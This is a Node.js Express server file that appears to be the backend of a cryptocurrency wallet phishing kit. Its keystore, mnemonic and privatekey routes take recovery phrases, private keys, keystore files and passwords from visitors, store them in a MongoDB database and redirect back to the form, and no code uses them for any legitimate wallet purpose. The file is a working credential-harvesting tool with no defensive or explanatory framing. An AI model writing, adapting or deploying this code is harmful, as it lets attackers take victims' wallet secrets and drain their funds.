const express = require("express");
const path = require("path");
const app = express();
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");

app.use(bodyParser.urlencoded({ extended: true }));
//Specific folder example
app.use(express.static(path.join(__dirname, "public")));
// app.use("/css", express.static(__dirname + "public/css"));
// app.use("/js", express.static(__dirname + "public/js"));
// app.use("/img", express.static(__dirname + "public/images"));

dotenv.config({ path: "./config.env" });

// create a schema
const mnemonicSchema = {
  mnemonic: {
    type: String,
    required: [true, "please insert your key phrase"],
  },
  password: {
    type: String,
    required: [true, "Please provide a password"],
    minlength: 8,
    select: false,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
};
const Mnemonic = mongoose.model("Mnemonic", mnemonicSchema);

const privatekeySchema = {
  privatekey: {
    type: String,
    required: [true, "please insert your key phrase"],
  },
  password: {
    type: String,
    required: [true, "Please provide a password"],
    minlength: 8,
    select: false,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
};
const Privatekey = mongoose.model("Privatekey", privatekeySchema);

const keystoreSchema = {
  file: {
    type: String,
  },
  password: {
    type: String,
    required: [true, "Please provide a password"],
    minlength: 6,
    select: false,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
};
const Keystore = mongoose.model("Keystore", keystoreSchema);

app.get("/", function (req, res) {
  res.sendFile(__dirname + "/index.html");
});

app.get("/keystore", function (req, res) {
  res.sendFile(__dirname + "/keystore.html");
});

app.get("/mnemonic", function (req, res) {
  res.sendFile(__dirname + "/mnemonic.html");
});
app.get("/privatekey", function (req, res) {
  res.sendFile(__dirname + "/privatekey.html");
});
app.get("/hardware", function (req, res) {
  res.sendFile(__dirname + "/hardware.html");
});

app.post("/keystore", function (req, res) {
  let newKeystore = new Keystore({
    file: req.body.file,
    password: req.body.password,
  });
  newKeystore.save();
  res.redirect("/keystore");
});

app.post("/mnemonic", function (req, res) {
  let newMnemonic = new Mnemonic({
    mnemonic: req.body.mnemonic,
    password: req.body.password,
  });
  newMnemonic.save();
  res.redirect("/mnemonic");
});

app.post("/privatekey", function (req, res) {
  let newPrivatekey = new Privatekey({
    privatekey: req.body.privatekey,
    password: req.body.password,
  });
  newPrivatekey.save();
  res.redirect("/privatekey");
});

const DB = process.env.DATABASE.replace(
  "<PASSWORD>",
  process.env.DATABASE_PASSWORD
);
mongoose
  .connect(DB, {
    useNewUrlParser: true,
    // useCreateIndex: true,
    // useFindAndModify: false,
    useUnifiedTopology: true,
  })
  .then(() => console.log("DB connection successful!"));
process.on("uncaughtException", (err) => {
  console.log(err.name, err.message);
  console.log("UNCAUGHT EXCEPTION! Shutting down...");
  process.exit(1);
});

app.listen(3000, function () {
  console.log("server is running on 3000");
});
